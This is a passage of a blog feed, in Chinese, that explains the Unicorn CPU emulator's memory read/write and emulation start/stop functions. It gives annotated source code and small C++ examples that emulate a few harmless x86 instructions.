aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> @uc: uc_open() 返回的句柄</span><br><span class="line"> @address: 写入字节的起始地址</span><br><span class="line"> @bytes:   指向一个包含要写入内存的数据的指针</span><br><span class="line"> @size:   要写入的内存大小。</span><br><span class="line"></span><br><span class="line"> 注意: @bytes 必须足够大以包含 @size 字节。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_write</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">const</span> <span class="keyword">void</span> *_bytes, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span> *bytes = _bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, <span class="built_in">size</span>))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_WRITE_UNMAPPED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存区域可以重叠相邻的内存块</span></span><br><span class="line">    <span class="keyword">while</span>(count &lt; <span class="built_in">size</span>) &#123;</span><br><span class="line">        MemoryRegion *mr = memory_mapping(uc, address);</span><br><span class="line">        <span class="keyword">if</span> (mr) &#123;</span><br><span class="line">            <span class="keyword">uint32_t</span> operms = mr-&gt;perms;</span><br><span class="line">            <span class="keyword">if</span> (!(operms &amp; UC_PROT_WRITE)) <span class="comment">// 没有写保护</span></span><br><span class="line">                <span class="comment">// 标记为可写</span></span><br><span class="line">                uc-&gt;readonly_mem(mr, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            len = (<span class="keyword">size_t</span>)MIN(<span class="built_in">size</span> - count, mr-&gt;<span class="built_in">end</span> - address);</span><br><span class="line">            <span class="keyword">if</span> (uc-&gt;write_mem(&amp;uc-&gt;as, address, bytes, len) == <span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!(operms &amp; UC_PROT_WRITE)) <span class="comment">// 没有写保护</span></span><br><span class="line">                <span class="comment">// 设置写保护</span></span><br><span class="line">                uc-&gt;readonly_mem(mr, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            count += len;</span><br><span class="line">            address += len;</span><br><span class="line">            bytes += len;</span><br><span class="line">        &#125; <span class="keyword">else</span>  <span class="comment">// 此地址尚未被映射</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="built_in">size</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_WRITE_UNMAPPED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x41\x4a"</span> <span class="comment">// INC ecx; DEC edx</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uc_mem_read(uc,ADDRESS,&amp;code, <span class="keyword">sizeof</span>(code))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to read emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; code &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/19/l4HhgDzcJIVvFNU.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/19/l4HhgDzcJIVvFNU.png" class="lazyload"></a></p><h3 id="uc-mem-read"><a href="#uc-mem-read" class="headerlink" title="uc_mem_read"></a>uc_mem_read</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_read</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">void</span> *bytes, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure></div><p>从内存中读取字节。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> @uc: uc_open() 返回的句柄</span><br><span class="line"> @address: 读取字节的起始地址</span><br><span class="line"> @bytes:   指向一个包含要读取内存的数据的指针</span><br><span class="line"> @size:   要读取的内存大小。</span><br><span class="line"></span><br><span class="line"> 注意: @bytes 必须足够大以包含 @size 字节。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_read</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">void</span> *_bytes, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>, len;</span><br><span class="line">    <span class="keyword">uint8_t</span> *bytes = _bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, <span class="built_in">size</span>))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_READ_UNMAPPED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存区域可以重叠相邻的内存块</span></span><br><span class="line">    <span class="keyword">while</span>(count &lt; <span class="built_in">size</span>) &#123;</span><br><span class="line">        MemoryRegion *mr = memory_mapping(uc, address);</span><br><span class="line">        <span class="keyword">if</span> (mr) &#123;</span><br><span class="line">            len = (<span class="keyword">size_t</span>)MIN(<span class="built_in">size</span> - count, mr-&gt;<span class="built_in">end</span> - address);</span><br><span class="line">            <span class="keyword">if</span> (uc-&gt;read_mem(&amp;uc-&gt;as, address, bytes, len) == <span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            count += len;</span><br><span class="line">            address += len;</span><br><span class="line">            bytes += len;</span><br><span class="line">        &#125; <span class="keyword">else</span>  <span class="comment">// 此地址尚未被映射</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="built_in">size</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_READ_UNMAPPED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_mem_write()</p><h3 id="uc-emu-start"><a href="#uc-emu-start" class="headerlink" title="uc_emu_start"></a>uc_emu_start</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_start</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> <span class="built_in">begin</span>, <span class="keyword">uint64_t</span> until, <span class="keyword">uint64_t</span> timeout, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure></div><p>在指定的时间内模拟机器码。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@begin: 开始模拟的地址</span><br><span class="line">@until: 模拟停止的地址 (当到达该地址时)</span><br><span class="line">@timeout: 模拟代码的持续时间(以微秒计)。当这个值为0时，将在无限时间内模拟代码，直到代码完成。</span><br><span class="line">@count: 要模拟的指令数。当这个值为0时，将模拟所有可用的代码，直到代码完成</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_start</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> <span class="built_in">begin</span>, <span class="keyword">uint64_t</span> until, <span class="keyword">uint64_t</span> timeout, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 重制计数器</span></span><br><span class="line">    uc-&gt;emu_counter = <span class="number">0</span>;</span><br><span class="line">    uc-&gt;invalid_error = UC_ERR_OK;</span><br><span class="line">    uc-&gt;block_full = <span class="literal">false</span>;</span><br><span class="line">    uc-&gt;emulation_done = <span class="literal">false</span>;</span><br><span class="line">    uc-&gt;timed_out = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(uc-&gt;arch) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_M68K:</span><br><span class="line">            uc_reg_write(uc, UC_M68K_REG_PC, &amp;<span class="built_in">begin</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_X86:</span><br><span class="line">            <span class="keyword">switch</span>(uc-&gt;mode) &#123;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> UC_MODE_16: &#123;</span><br><span class="line">                    <span class="keyword">uint64_t</span> ip;</span><br><span class="line">                    <span class="keyword">uint16_t</span> cs;</span><br><span class="line"></span><br><span class="line">                    uc_reg_read(uc, UC_X86_REG_CS, &amp;cs);</span><br><span class="line">                    <span class="comment">// 抵消后面增加的 IP 和 CS</span></span><br><span class="line">                    ip = <span class="built_in">begin</span> - cs*<span class="number">16</span>;</span><br><span class="line">                    uc_reg_write(uc, UC_X86_REG_IP, &amp;ip);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> UC_MODE_32:</span><br><span class="line">                    uc_reg_write(uc, UC_X86_REG_EIP, &amp;<span class="built_in">begin</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> UC_MODE_64:</span><br><span class="line">                    uc_reg_write(uc, UC_X86_REG_RIP, &amp;<span class="built_in">begin</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:</span><br><span class="line">            uc_reg_write(uc, UC_ARM_REG_R15, &amp;<span class="built_in">begin</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM64:</span><br><span class="line">            uc_reg_write(uc, UC_ARM64_REG_PC, &amp;<span class="built_in">begin</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_MIPS:</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> MIPS32/MIPS64/BIGENDIAN etc</span></span><br><span class="line">            uc_reg_write(uc, UC_MIPS_REG_PC, &amp;<span class="built_in">begin</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_SPARC:</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Sparc/Sparc64</span></span><br><span class="line">            uc_reg_write(uc, UC_SPARC_REG_PC, &amp;<span class="built_in">begin</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc-&gt;stop_request = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    uc-&gt;emu_count = count;</span><br><span class="line">    <span class="comment">// 如果不需要计数，则移除计数挂钩hook</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span> &amp;&amp; uc-&gt;count_hook != <span class="number">0</span>) &#123;</span><br><span class="line">        uc_hook_del(uc, uc-&gt;count_hook);</span><br><span class="line">        uc-&gt;count_hook = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置计数hook记录指令数</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; uc-&gt;count_hook == <span class="number">0</span>) &#123;</span><br><span class="line">        uc_err err;</span><br><span class="line">        <span class="comment">// 对计数指令的回调必须在所有其他操作之前运行，因此必须在hook列表的开头插入hook，而不是附加hook</span></span><br><span class="line">        uc-&gt;hook_insert = <span class="number">1</span>;</span><br><span class="line">        err = uc_hook_add(uc, &amp;uc-&gt;count_hook, UC_HOOK_CODE, hook_count_cb, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 恢复到 uc_hook_add()</span></span><br><span class="line">        uc-&gt;hook_insert = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc-&gt;addr_end = until;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout)</span><br><span class="line">        enable_emu_timer(uc, timeout * <span class="number">1000</span>);   <span class="comment">// microseconds -&gt; nanoseconds</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;vm_start(uc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_RESOURCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟完成</span></span><br><span class="line">    uc-&gt;emulation_done = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">        <span class="comment">// 等待超时</span></span><br><span class="line">        qemu_thread_join(&amp;uc-&gt;timer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uc-&gt;timed_out)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_TIMEOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uc-&gt;invalid_error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x33\xC0"</span> <span class="comment">// xor  eax, eax</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x111</span>;</span><br><span class="line">    </span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; before EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">        err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; after EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/19/K4HMijIVt6lofvT.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/19/K4HMijIVt6lofvT.png" class="lazyload"></a></p><h3 id="uc-emu-stop"><a href="#uc-emu-stop" class="headerlink" title="uc_emu_stop"></a>uc_emu_stop</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_stop</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure></div><p>停止模拟</p><p>通常是从通过 tracing API注册的回调函数中调用。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_stop</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;emulation_done)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line"></span><br><span class="line">    uc-&gt;stop_request = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;current_cpu) &#123;</span><br><span class="line">        <span class="comment">// 退出当前线程</span></span><br><span class="line">        cpu_exit(uc-&gt;current_cpu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">uc_emu_stop(uc);</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-三&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-三&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(二)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-03-16T04:50:48.592Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-二"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-二" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(二)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(二)</h1><h2 id="0x2-API分析"><a href="#0x2-API分析" class="headerlink" title="0x2 API分析"></a>0x2 API分析</h2><h3 id="uc-version"><a href="#uc-version" class="headerlink" title="uc_version"></a>uc_version</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">uc_version</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *major, <span class="keyword">unsigned</span> <span class="keyword">int</span> *minor)</span></span>;</span><br></pre></td></tr></table></figure></div><p>用于返回Unicorn API主次版本信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@major: API主版本号</span><br><span class="line">@minor: API次版本号</span><br><span class="line">@return 16进制数，计算方式 (major &lt;&lt; 8 | minor)</span><br><span class="line"></span><br><span class="line">提示: 该返回值可以和宏UC_MAKE_VERSION比较</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" 